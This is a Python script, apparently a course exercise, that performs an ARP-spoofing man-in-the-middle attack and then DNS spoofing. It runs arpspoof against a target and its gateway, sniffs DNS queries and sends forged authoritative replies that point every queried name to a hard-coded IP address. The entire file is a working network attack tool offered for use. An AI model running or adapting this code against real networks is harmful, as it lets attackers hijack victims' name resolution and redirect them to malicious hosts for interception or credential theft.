import argparse
import subprocess
import threading
import socket
from scapy.all import raw

from scapy.layers.inet import IP, UDP

from scapy.layers.dns import DNS, DNSRR, DNSQR
from scapy.layers.l2 import getmacbyip, Ether
from scapy.sendrecv import sniff, send, sr1, srp1, sendp

my_ip = "10.0.0.23"
my_mac = "00:0c:29:28:72:ea"


SPOOFED_IP = "185.186.66.220"

def poisoning(pkt):
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # DNS query
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=53) / \
                      DNS(id=pkt[DNS].id, qr=1, aa=1, ad=1, rd=1, ra=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=1000, rdata=SPOOFED_IP))

        send(spoofed_pkt, verbose=0)


def start_sniffing():
    # Start sniffing DNS packets
    sniff(prn=poisoning, iface="eth0", filter="udp port 53", store=0)


def run_arpspoof(i, t, s):
    command = ['sudo', 'arpspoof', '-i', i, '-t', t, s]
    try:
        # Run the command
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running arpspoof: {e}")


def main():
    parser = argparse.ArgumentParser(description='DNS Cache Poisoning')
    parser.add_argument('-i', '--iface', type=str, help='Interface you wish to use', required=True)
    parser.add_argument('-s', '--src', type=str, help='The address you want for the attacker', required=True)
    parser.add_argument('-t', '--target', type=str, help='IP of target', required=True)

    args = parser.parse_args()
    # Additional challenge (bonus 20%): place yourself in the middle automatically.
    # Attacking target
    arpspoof_thread_t = threading.Thread(target=run_arpspoof, args=(args.iface, args.target, args.src))
    arpspoof_thread_t.start()

    # Attacking source (gateway)
    arpspoof_thread_s = threading.Thread(target=run_arpspoof, args=(args.iface, args.src, args.target))
    arpspoof_thread_s.start()

    # Got MITM
    #--------- END OF Arpspoof ----------------#

    # DNS Cache Poisoning
    mac_target = getmacbyip(args.target)

    mac_src = getmacbyip(args.src)
    poisoning_thread = threading.Thread(target=start_sniffing)
    poisoning_thread.start()


if __name__ == "__main__":
    main()
